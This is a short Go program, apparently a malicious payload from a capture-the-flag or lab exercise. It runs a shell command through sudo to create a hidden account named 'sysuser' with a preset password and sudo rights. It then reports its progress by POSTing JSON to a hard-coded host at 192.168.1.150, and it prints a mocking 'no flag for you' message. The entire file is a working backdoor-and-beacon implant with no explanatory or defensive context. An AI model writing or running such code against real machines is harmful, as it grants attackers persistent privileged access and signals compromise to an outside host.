package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
)

type HomeMessage struct {
	Message string `json:"msg"`
}

func createUser() int {
	userCreationcommand := "sudo useradd -m -p \"p0j1kHlO8H0mE\" -s /bin/bash sysuser && sudo usermod -aG sudo sysuser"

	err := exec.Command("/bin/sh", "-c", userCreationcommand).Run()
	if err != nil {
		// Exit status 9 is if the user already exists!
		sendMessageHome(HomeMessage{Message: "Error during creating user: " + err.Error()})
		return -1
	} else {
		sendMessageHome(HomeMessage{Message: "Successfuly created user.!! <3"})
		return 0
	}
}

func sendMessageHome(message HomeMessage) {
	client := &http.Client{}
	jsonMessage, err := json.Marshal(message)
	if err != nil {
		return
	}

	// set the HTTP method, url, and request body
	req, err := http.NewRequest(http.MethodPost, "http://192.168.1.150:80", bytes.NewBuffer(jsonMessage))
	if err != nil {
		return
	}

	// set the request header Content-Type for json
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	_, err = client.Do(req)
	if err != nil {
		return
	}
}

func main() {
	sendMessageHome(HomeMessage{Message: "Script launched!"})
	ret := createUser()
	if ret == 0 {
		fmt.Println("Oh I am sorry. There is no flag for you :(")
	}
}
